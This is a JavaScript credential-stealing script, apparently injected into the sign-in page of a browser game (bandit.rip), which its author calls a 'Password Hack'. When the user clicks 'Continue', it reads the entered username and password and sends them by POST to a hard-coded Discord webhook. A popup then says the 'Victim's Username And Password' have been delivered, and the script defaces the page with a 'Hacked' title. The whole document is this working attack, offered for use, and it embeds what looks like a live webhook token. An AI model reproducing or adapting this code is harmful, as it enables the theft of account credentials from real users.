//I MADE THIS GYNOIDS
const passwordInput = document.getElementById("signin-password");
const usernameInput = document.getElementById("signin-username");


const boxContainer = document.createElement("div");
boxContainer.style.position = "fixed";
boxContainer.style.bottom = "20px";
boxContainer.style.right = "20px";
boxContainer.style.padding = "10px";
boxContainer.style.backgroundColor = "lightblue";
boxContainer.style.color = "darkblue";
boxContainer.style.border = "2px solid black";
boxContainer.style.borderRadius = "10px";
boxContainer.style.zIndex = "9999";

const title = document.createElement("strong");
title.textContent = "This Is A -bandit.rip- Password Hack That Was Created By Gynoids :)";
boxContainer.appendChild(title);

const text = document.createElement("p");
text.textContent = " This script may get you banned, I am not sure. I WILL NOT be held responsible for your actions and misuse of this script. DO NOT send it to your friends. And I'm still working on another hack for this browser game. But to be honest, thanks for using it!";
boxContainer.appendChild(text);

const continueButton = document.createElement("button");
continueButton.textContent = "Continue";
continueButton.style.backgroundColor = "lightblue";
continueButton.style.color = "darkblue";
continueButton.style.border = "1px solid darkblue";
continueButton.style.borderRadius = "5px";
continueButton.addEventListener("click", function() {
  boxContainer.style.display = "none";
  passwordInput.type = "text";
  usernameInput.type = "text";


  const password = passwordInput.value;
  const username = usernameInput.value;


  const xhr = new XMLHttpRequest();


  const webhookUrl = "https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w";

  const payload = JSON.stringify({
    content: `**Username:** ${username}\n**Password:** ${password}\n\nThis was made by Gynoids :)  -  To Be Honest Thank You For Using My Scripts, You May Get Alot Of Hate Though.`,
  });

  xhr.open("POST", webhookUrl, true);


  xhr.setRequestHeader("Content-Type", "application/json");


  xhr.send(payload);

  const textBox = document.createElement("div");
  textBox.style.position = "fixed";
  textBox.style.bottom = "20px";
  textBox.style.right = "20px";
  textBox.style.padding = "10px";
  textBox.style.backgroundColor = "lightblue";
  textBox.style.color = "darkblue";
  textBox.style.border = "2px solid black";
  textBox.style.borderRadius = "10px";
  textBox.style.zIndex = "9999";

  const textBoxTitle = document.createElement("strong");
  textBoxTitle.textContent = "Check Your Discord Server With The Webhook Link";
  textBox.appendChild(textBoxTitle);

  const textBoxText = document.createElement("p");
  textBoxText.textContent = "The Victim's Username And Password Should Be Sent To Your Discord Webhook Link.";
  textBox.appendChild(textBoxText);

  const closeButton = document.createElement("button");
  closeButton.textContent = "Close";
  closeButton.style.backgroundColor = "lightblue";
  closeButton.style.color = "darkblue";
  closeButton.style.border = "1px solid darkblue";
  closeButton.style.borderRadius = "5px";
  closeButton.addEventListener("click", function() {
    textBox.style.display = "none";

    // THIS WAS MADE BY GYNOIDS
    const signInTitle = document.getElementById("signup-title");
    signInTitle.textContent = "Hacked - You Have The Power!";

    // THIS WAS MADE BY GYNOIDS
    const topbarElement = document.getElementById("topbar");
    topbarElement.parentNode.removeChild(topbarElement);

    // THIS WAS MADE BY GYNOIDS
    const bottombarElement = document.getElementsByClassName("bottombar")[0];
    bottombarElement.parentNode.removeChild(bottombarElement);

    // THIS WAS MADE BY GYNOIDS
    const signUpSignInElement = document.getElementById("signup-signin");
    signUpSignInElement.parentNode.removeChild(signUpSignInElement);

    // THIS WAS MADE BY GYNOIDS
    const signUpForgotPasswordElements = document.getElementsByClassName("signup-forgotpassword");
    while (signUpForgotPasswordElements.length > 0) {
      signUpForgotPasswordElements[0].parentNode.removeChild(signUpForgotPasswordElements[0]);
    }

    // THIS WAS MADE BY GYNOIDS
    const signInPasswordElement = document.getElementById("signin-password");
    signInPasswordElement.parentNode.removeChild(signInPasswordElement);

    // THIS WAS MADE BY GYNOIDS
    const signInUsernameElement = document.getElementById("signin-username");
    signInUsernameElement.parentNode.removeChild(signInUsernameElement);

    // THIS WAS MADE BY GYNOIDS
    const signUpTextElements = document.getElementsByClassName("signup-text");
    while (signUpTextElements.length > 0) {
      signUpTextElements[0].parentNode.removeChild(signUpTextElements[0]);
    }

    // THIS WAS MADE BY GYNOIDS
    const signInPassword2Element = document.getElementById("signin-password2");
    signInPassword2Element.parentNode.removeChild(signInPassword2Element);

    // THIS WAS MADE BY GYNOIDS
    const signInButton = document.getElementById("signin-button");
    signInButton.textContent = "Other Projects Of Mine!";
    signInButton.addEventListener("click", function() {
      window.open("https://github.com/Gynoids", "_blank");
    });
  });

  textBox.appendChild(closeButton);

  document.body.appendChild(textBox);
});

boxContainer.appendChild(continueButton);

const otherProjectsButton = document.createElement("button");
otherProjectsButton.textContent = "Other Projects";
otherProjectsButton.style.backgroundColor = "lightblue";
otherProjectsButton.style.color = "darkblue";
otherProjectsButton.style.border = "1px solid darkblue";
otherProjectsButton.style.borderRadius = "5px";
otherProjectsButton.addEventListener("click", function() {
  window.open("https://github.com/Gynoids", "_blank");
});

boxContainer.appendChild(otherProjectsButton);

document.body.appendChild(boxContainer);

// THIS WAS MADE BY GYNOIDS
const signUpForgotPasswordElement = document.getElementById("signup-forgotpassword");
if (signUpForgotPasswordElement) {
  signUpForgotPasswordElement.parentNode.removeChild(signUpForgotPasswordElement);
}
